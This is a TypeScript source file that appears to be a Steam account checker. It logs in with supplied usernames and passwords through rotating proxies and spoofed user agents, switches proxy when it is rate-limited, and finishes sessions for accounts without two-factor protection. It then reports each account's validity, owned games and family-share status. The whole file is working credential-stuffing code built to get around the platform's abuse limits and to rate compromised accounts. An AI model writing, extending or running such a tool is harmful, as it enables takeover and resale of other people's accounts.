// @ts-nocheck
import crypto from "crypto";
import { logger } from "./logger";
import { pickProxies, fetchViaProxy } from "./proxyManager";

const USER_AGENTS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
];

function ua() {
  return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
}

function makeHeaders(extra?: Record<string, string>): Record<string, string> {
  return {
    "User-Agent": ua(),
    Accept: "application/json, text/plain, */*",
    ...extra,
  };
}

function encryptPassword(password: string, modHex: string, expHex: string): string {
  const padded = modHex.length % 2 === 1 ? "0" + modHex : modHex;
  const paddedExp = expHex.length % 2 === 1 ? "0" + expHex : expHex;
  const jwk = {
    kty: "RSA",
    n: Buffer.from(padded, "hex").toString("base64url"),
    e: Buffer.from(paddedExp, "hex").toString("base64url"),
  };
  const key = crypto.createPublicKey({ key: jwk as any, format: "jwk" });
  return crypto
    .publicEncrypt({ key, padding: crypto.constants.RSA_PKCS1_PADDING }, Buffer.from(password, "utf8"))
    .toString("base64");
}

/* ============================
   Proxy-aware Steam API calls
   ============================ */

async function getRsaKey(
  username: string,
  proxies: Awaited<ReturnType<typeof pickProxies>>,
  proxyIndex: number = 0,
): Promise<{ mod: string; exp: string; timestamp: string; proxyIndex: number } | null> {
  if (proxyIndex > proxies.length) return null;
  const proxy = proxyIndex < proxies.length ? proxies[proxyIndex] : null; // null = direct connection fallback
  try {
    const url = new URL("https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1/");
    url.searchParams.set("account_name", username);
    const res = await fetchViaProxy(
      url.toString(),
      { headers: makeHeaders(), signal: AbortSignal.timeout(15_000) },
      proxy,
    );
    if (res === null) {
      logger.warn({ proxyIndex, proxy: proxy?.url }, "getRsaKey proxy failed — trying next");
      return getRsaKey(username, proxies, proxyIndex + 1);
    }
    if (res.status !== 200) {
      logger.warn({ status: res.status, proxyIndex }, "getRsaKey bad status — trying next proxy");
      return getRsaKey(username, proxies, proxyIndex + 1);
    }
    const data = await res.json() as Record<string, Record<string, string>>;
    const r = data.response ?? {};
    if (!r.publickey_mod) {
      return getRsaKey(username, proxies, proxyIndex + 1);
    }
    return { mod: r.publickey_mod, exp: r.publickey_exp, timestamp: r.timestamp, proxyIndex };
  } catch (e) {
    logger.warn({ err: e, proxyIndex }, "getRsaKey exception — trying next proxy");
    return getRsaKey(username, proxies, proxyIndex + 1);
  }
}

async function beginAuthSession(
  username: string,
  encPassword: string,
  timestamp: string,
  proxies: Awaited<ReturnType<typeof pickProxies>>,
  proxyIndex: number = 0,
): Promise<{ response: Record<string, unknown>; proxyIndex: number } | null> {
  if (proxyIndex > proxies.length) return null;
  const proxy = proxyIndex < proxies.length ? proxies[proxyIndex] : null; // null = direct connection fallback
  try {
    const body = new URLSearchParams({
      account_name: username,
      encrypted_password: encPassword,
      encryption_timestamp: timestamp,
      persistence: "1",
      platform_type: "2",
      website_id: "Community",
    });
    const res = await fetchViaProxy(
      "https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1/",
      {
        method: "POST",
        headers: makeHeaders({ "Content-Type": "application/x-www-form-urlencoded" }),
        body: body.toString(),
        signal: AbortSignal.timeout(15_000),
      },
      proxy,
    );
    if (res === null) {
      logger.warn({ proxyIndex }, "BeginAuth proxy failed — trying next");
      return beginAuthSession(username, encPassword, timestamp, proxies, proxyIndex + 1);
    }
    const text = await res.text();
    logger.info({ status: res.status, preview: text.slice(0, 200), proxyIndex }, "BeginAuthSession");
    if (res.status === 200) {
      const data = JSON.parse(text) as Record<string, unknown>;
      return { response: (data.response as Record<string, unknown>) ?? {}, proxyIndex };
    }
    if (res.status === 400) {
      return { response: {}, proxyIndex };
    }
    if (res.status === 429) {
      logger.warn({ proxyIndex }, "BeginAuth rate limited — trying next proxy");
      return beginAuthSession(username, encPassword, timestamp, proxies, proxyIndex + 1);
    }
    return beginAuthSession(username, encPassword, timestamp, proxies, proxyIndex + 1);
  } catch (e) {
    logger.warn({ err: e, proxyIndex }, "BeginAuth exception — trying next proxy");
    return beginAuthSession(username, encPassword, timestamp, proxies, proxyIndex + 1);
  }
}

async function pollAuthSession(
  clientId: string,
  requestId: string,
  proxies: Awaited<ReturnType<typeof pickProxies>>,
  proxyIndex: number = 0,
): Promise<Record<string, unknown> | null> {
  if (proxyIndex > proxies.length) return null;
  const proxy = proxyIndex < proxies.length ? proxies[proxyIndex] : null; // null = direct connection fallback
  try {
    const body = new URLSearchParams({ client_id: clientId, request_id: requestId });
    const res = await fetchViaProxy(
      "https://api.steampowered.com/IAuthenticationService/PollAuthSessionStatus/v1/",
      {
        method: "POST",
        headers: makeHeaders({ "Content-Type": "application/x-www-form-urlencoded" }),
        body: body.toString(),
        signal: AbortSignal.timeout(15_000),
      },
      proxy,
    );
    if (res === null) {
      return pollAuthSession(clientId, requestId, proxies, proxyIndex + 1);
    }
    if (res.status === 200) {
      const data = await res.json() as Record<string, unknown>;
      return (data.response as Record<string, unknown>) ?? {};
    }
    return pollAuthSession(clientId, requestId, proxies, proxyIndex + 1);
  } catch (e) {
    logger.warn({ err: e, proxyIndex }, "pollAuthSession exception — trying next proxy");
    return pollAuthSession(clientId, requestId, proxies, proxyIndex + 1);
  }
}

async function finalizeLogin(
  refreshToken: string,
  sessionid: string,
  proxies: Awaited<ReturnType<typeof pickProxies>>,
  proxyIndex: number = 0,
): Promise<boolean> {
  if (proxyIndex > proxies.length) return false;
  const proxy = proxyIndex < proxies.length ? proxies[proxyIndex] : null; // null = direct connection fallback
  try {
    const body = new URLSearchParams({
      nonce: refreshToken,
      sessionid,
      redir: "https://steamcommunity.com/login/home/?goto=",
    });
    const res = await fetchViaProxy(
      "https://login.steampowered.com/jwt/finalizelogin",
      {
        method: "POST",
        headers: makeHeaders({ "Content-Type": "application/x-www-form-urlencoded" }),
        body: body.toString(),
        signal: AbortSignal.timeout(15_000),
      },
      proxy,
    );
    return res !== null && res.status === 200;
  } catch (e) {
    logger.warn({ err: e, proxyIndex }, "finalizeLogin exception — trying next proxy");
    return finalizeLogin(refreshToken, sessionid, proxies, proxyIndex + 1);
  }
}

async function getOwnedGames(
  steamid64: string,
  accessToken?: string,
  proxies?: Awaited<ReturnType<typeof pickProxies>>,
  proxyIndex: number = 0,
): Promise<string[]> {
  if (!steamid64) return [];

  if (accessToken && proxies && proxyIndex < proxies.length) {
    const proxy = proxies[proxyIndex] ?? null;
    try {
      const url = new URL("https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/");
      url.searchParams.set("access_token", accessToken);
      url.searchParams.set("steamid", steamid64);
      url.searchParams.set("include_appinfo", "1");
      const res = await fetchViaProxy(
        url.toString(),
        { headers: makeHeaders(), signal: AbortSignal.timeout(20_000) },
        proxy,
      );
      if (res !== null && res.status === 200) {
        const data = await res.json() as Record<string, unknown>;
        const r = (data.response ?? {}) as Record<string, unknown>;
        const games = (r.games ?? []) as Array<Record<string, unknown>>;
        const names = games.map((g) => String(g.name ?? "")).filter(Boolean);
        logger.info({ count: names.length, proxyIndex }, "GetOwnedGames API success via proxy");
        return names;
      }
    } catch (e) {
      logger.warn({ err: e, proxyIndex }, "GetOwnedGames API proxy failed — trying next");
      return getOwnedGames(steamid64, accessToken, proxies, proxyIndex + 1);
    }
  }

  // HTML fallback (no proxy needed — works if library is public)
  try {
    const url = `https://steamcommunity.com/profiles/${steamid64}/games/?tab=all`;
    const res = await fetch(url, {
      headers: makeHeaders(),
      signal: AbortSignal.timeout(20_000),
    });
    if (res.status === 200) {
      const html = await res.text();
      const idx = html.indexOf("var rgGames = ");
      if (idx !== -1) {
        const start = html.indexOf("[", idx);
        if (start !== -1) {
          let depth = 0;
          let end = start;
          for (let i = start; i < html.length; i++) {
            if (html[i] === "[") depth++;
            else if (html[i] === "]") depth--;
            if (depth === 0) { end = i + 1; break; }
          }
          const gamesData = JSON.parse(html.slice(start, end)) as Array<Record<string, unknown>>;
          const names = gamesData
            .filter((g) => {
              const hours = Number(String(g.hours_forever ?? "0").replace(/,/g, ""));
              const lastPlayed = Number(g.last_played ?? 0);
              return hours > 0 || lastPlayed > 0;
            })
            .map((g) => String(g.name ?? "")).filter(Boolean);
          logger.info({ count: names.length }, "GetOwnedGames HTML fallback success");
          return names;
        }
      }
    }
  } catch (e) {
    logger.warn({ err: e }, "GetOwnedGames HTML fallback failed");
  }

  return [];
}

/* ============================
   Family group detection
   ============================ */

async function isSteamFamilyShareAccount(
  accessToken: string,
  proxies: Awaited<ReturnType<typeof pickProxies>>,
  proxyIndex: number = 0,
): Promise<boolean> {
  if (!accessToken || proxyIndex > proxies.length) return false;
  const proxy = proxyIndex < proxies.length ? proxies[proxyIndex] : null; // null = direct connection fallback
  try {
    const url = new URL("https://api.steampowered.com/IFamilyGroupsService/GetFamilyGroupForUser/v1/");
    url.searchParams.set("access_token", accessToken);
    const res = await fetchViaProxy(
      url.toString(),
      { headers: makeHeaders(), signal: AbortSignal.timeout(15_000) },
      proxy,
    );
    if (res === null) {
      logger.warn({ proxyIndex }, "GetFamilyGroupForUser proxy failed — trying next");
      return isSteamFamilyShareAccount(accessToken, proxies, proxyIndex + 1);
    }
    if (res.status !== 200) {
      logger.warn({ status: res.status }, "GetFamilyGroupForUser bad status");
      return false;
    }
    const data = await res.json() as Record<string, unknown>;
    const r = (data.response ?? {}) as Record<string, unknown>;
    // If is_not_member_of_any_group is true, the account is not in any family group
    if (r.is_not_member_of_any_group === true) return false;
    // family_groupid is a string; "0" means no group
    const groupId = String(r.family_groupid ?? "0");
    const inFamily = groupId !== "0" && groupId !== "";
    logger.info({ groupId, inFamily }, "GetFamilyGroupForUser result");
    return inFamily;
  } catch (e) {
    logger.warn({ err: e, proxyIndex }, "GetFamilyGroupForUser exception — trying next");
    return isSteamFamilyShareAccount(accessToken, proxies, proxyIndex + 1);
  }
}

/* ============================
   Main credential checker
   ============================ */

export type CheckResult =
  | { status: "valid"; message: string; games: string[]; steamid: string; isFamilyShare: boolean }
  | { status: "invalid"; message: string; games: string[]; steamid: string; isFamilyShare: boolean }
  | { status: "rate_limited"; message: string; games: string[]; steamid: string; isFamilyShare: boolean }
  | { status: "error"; message: string; games: string[]; steamid: string; isFamilyShare: boolean };

export async function checkSteamCredentials(username: string, password: string): Promise<CheckResult> {
  // Pick a fresh batch of 3 random proxies for this credential check
  const proxies = await pickProxies(3);
  logger.info({ count: proxies.length, usernames: proxies.map((p) => `${p.host}:${p.port}`) }, "Proxy pool for this check");

  if (proxies.length === 0) {
    logger.warn("No proxies available — falling back to direct connection");
  }

  for (let attempt = 0; attempt < 3; attempt++) {
    try {
      logger.info({ username, attempt }, "Steam check — getting RSA key");
      const rsa = await getRsaKey(username, proxies);
      if (!rsa) {
        logger.warn({ attempt }, "getRsaKey returned null on all proxies — retrying");
        await new Promise((r) => setTimeout(r, 2000));
        continue;
      }

      const encPassword = encryptPassword(password, rsa.mod, rsa.exp);

      const auth = await beginAuthSession(username, encPassword, rsa.timestamp, proxies, rsa.proxyIndex);
      if (auth === null) {
        logger.warn({ attempt }, "BeginAuth failed on all proxies — retrying");
        await new Promise((r) => setTimeout(r, 3000));
        continue;
      }

      if (!auth.response || Object.keys(auth.response).length === 0) {
        return { status: "invalid", message: "Wrong username or password", games: [], steamid: "", isFamilyShare: false };
      }

      // Steam returns HTTP 200 with eresult != 1 for bad credentials (e.g. eresult=5 = InvalidPassword)
      const eresult = Number((auth.response as any).eresult ?? 1);
      if (eresult !== 1 && eresult !== 0) {
        logger.info({ eresult }, "BeginAuth returned non-OK eresult — invalid credentials");
        return { status: "invalid", message: "Wrong username or password", games: [], steamid: "", isFamilyShare: false };
      }

      const steamid64 = String(auth.response.steamid ?? "");
      const clientId = String(auth.response.client_id ?? "");

      // If BeginAuth returned no usable session data (no steamid, no client_id), credentials are wrong
      if (!steamid64 && !clientId) {
        logger.info({ responseKeys: Object.keys(auth.response) }, "BeginAuth response has no steamid/client_id — invalid credentials");
        return { status: "invalid", message: "Wrong username or password", games: [], steamid: "", isFamilyShare: false };
      }
      const requestId = String(auth.response.request_id ?? "");
      const confirmations = (auth.response.allowed_confirmations ?? []) as Array<Record<string, unknown>>;
      const confTypes = new Set(confirmations.map((c) => Number(c.confirmation_type)));

      logger.info({ username, steamid64, confTypes: [...confTypes], proxyIndex: auth.proxyIndex }, "BeginAuth OK");

      // confirmation_type 2 = Email Steam Guard, 3 = Mobile authenticator, 4 = Device confirmation
      // All three block unattended login — treat as 2FA.
      // For 2FA accounts we don't obtain an access token, so fall back to game-count heuristic.
      if (confTypes.has(2) || confTypes.has(3) || confTypes.has(4)) {
        const games = await getOwnedGames(steamid64, undefined, proxies, auth.proxyIndex);
        const isFamilyShare = games.length === 0;
        return {
          status: "valid",
          message: `Account verified (2FA enabled) — ${games.length} game${games.length !== 1 ? "s" : ""} found`,
          games,
          steamid: steamid64,
          isFamilyShare,
        };
      }

      // No 2FA — poll for tokens
      const poll = await pollAuthSession(clientId, requestId, proxies, auth.proxyIndex);
      if (!poll) {
        return { status: "error", message: "Poll failed after auth", games: [], steamid: steamid64, isFamilyShare: false };
      }

      const refreshToken = String(poll.refresh_token ?? "");
      const accessToken = String(poll.access_token ?? "");

      if (!refreshToken) {
        return { status: "error", message: "No refresh token received", games: [], steamid: steamid64, isFamilyShare: false };
      }

      const sessionid = [...Array(24)].map(() => Math.floor(Math.random() * 16).toString(16)).join("");
      await finalizeLogin(refreshToken, sessionid, proxies, auth.proxyIndex);

      // Run games fetch and family-group check in parallel
      const [games, isFamilyShare] = await Promise.all([
        getOwnedGames(steamid64, accessToken || undefined, proxies, auth.proxyIndex),
        isSteamFamilyShareAccount(accessToken, proxies, auth.proxyIndex),
      ]);

      logger.info({ steamid64, gameCount: games.length, isFamilyShare }, "Steam check complete");

      return {
        status: "valid",
        message: `Account verified — ${games.length} game${games.length !== 1 ? "s" : ""} found${isFamilyShare ? " (family share)" : ""}`,
        games,
        steamid: steamid64,
        isFamilyShare,
      };

    } catch (e: unknown) {
      logger.warn({ err: e, attempt }, "Steam check attempt threw");
      if (attempt === 2) {
        return { status: "error", message: "Could not connect to Steam servers", games: [], steamid: "", isFamilyShare: false };
      }
      await new Promise((r) => setTimeout(r, 2000));
    }
  }

  return { status: "error", message: "Max retries exceeded", games: [], steamid: "", isFamilyShare: false };
}
